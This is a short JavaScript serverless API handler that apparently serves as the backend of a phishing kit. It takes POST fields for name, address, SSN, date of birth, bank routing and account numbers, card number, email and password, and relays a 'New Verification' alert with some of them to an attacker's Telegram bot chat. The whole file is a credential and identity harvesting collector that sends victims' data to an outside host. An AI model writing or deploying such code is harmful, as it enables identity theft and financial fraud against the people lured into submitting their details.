export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, address, ssn, dob, routing, account, card, email, password } = req.body;
  
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ error: 'Telegram credentials not configured' });
  }
  
  const message = `🔐 *New Verification*\n👤 Name: ${name}\n📍 Address: ${address}\n📧 Email: ${email}\n🕒 ${new Date().toLocaleString()}`;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    const data = await response.json();
    
    if (data.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: data.description });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
